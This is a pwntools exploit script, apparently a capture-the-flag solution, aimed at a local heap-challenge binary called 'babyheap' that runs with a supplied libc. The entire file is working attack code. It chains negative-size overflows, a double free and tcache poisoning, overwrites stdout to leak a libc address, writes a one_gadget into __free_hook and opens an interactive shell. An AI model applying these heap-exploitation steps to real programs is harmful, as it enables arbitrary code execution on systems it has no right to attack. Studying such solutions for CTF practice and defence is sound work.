#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./babyheap', env={'LD_PRELOAD':'./libc.so'})
lib = ELF('./libc.so')

def note(size, data, yes):
    r.recvuntil('option :')
    r.sendline("N")

    r.recvuntil('input size:')
    r.send(str(int(size, 16)))

    r.recvuntil('name :')
    r.send(data)

    r.recvuntil('free?(y/n)')
    r.sendline(yes)

note('0x78', 'a', 'n') # for offset
note('0', '', 'y')
note('0x18', 'a', 'y')
note('0x28', 'a', 'y')
note('0x38', 'a', 'y')
note('0x48', 'a', 'y')

# phase1
note('-1', '\x00'*0x18 + p64(0x51), "y")
note('0x28', 'a'*0x10, 'y')
note('-1', '\x00'*0x18 + p64(0x51) + '\x00', "y")
note('0x48', 'a', 'y')
note('0x48', '\xe0', 'n') # double free
note('0x48', 'a', 'n') # control next chunk addr


# phase2
note('0', '', 'n')
note('0', '', 'y')
note('0x58', 'a', 'y') # controlled , will be a chunk with size=0x520
note('0x68', 'a', 'y')
note('0x78', 'a', 'y')
note('0x3c8', 'a', 'y')
note('0xf8', 'a', 'n') # prevent consolidation
note('-1', 'c'*0x18 + '\x21\x05', "y") # 
note('0x58', 'a', 'y') # controlled

# alloc from chunk(0x520)
note('0x58', '\x20\xe7', 'n') # 1/16 contolling stdout
raw_input()
fake_stdout = p64(0xfbad1800) + p64(0)*3 + '\x00\xe6'

note('0x48', 'a', 'n')
note('0x48', fake_stdout, 'n') # 1/16 get stdout chunk
r.recvuntil('==============')
r.recvuntil('==============\n')
leak = u64(r.recv(6).ljust(8,'\x00')) - 0x1a59d6
#print hex(leak)

if '7f' not in str(hex(leak)): 
    exit(0)

one_gadget_off = [0x47c46, 0x47c9a, 0xfcc6e, 0xfdb1e]
free_hook = leak + lib.symbols['__free_hook']
one_gadget = leak + one_gadget_off[2]

# phase3
note('0', '', 'n')
note('0', '', 'n')
note('0', '', 'n')
note('0', '', 'n')
note('0', '', 'n')
note('0', '', 'n')
note('0', '', 'n') # for control low byte offset
note('0', '', 'y') 
note('-1', 'y'*0x18, "y") # 
note('0x98', 'n', 'y')
note('0xa8', 'n', 'y')
note('-1', '\x00'*0x18 + '\xb1', "y") # 
note('0x98', 'n', 'y')
note('-1', '\x00'*0x18 + p64(0xb1) + '\x20', "y") # 
note('0xa8', 'a', 'y')
#note('0xa8', 'aaaaaaaa', 'n') # control tcache again!
note('0xa8', p64(free_hook), 'n') # control tcache again!
note('0xa8', 'a', 'n')

#raw_input('#')
note('0xa8', p64(one_gadget), 'y')

r.interactive()
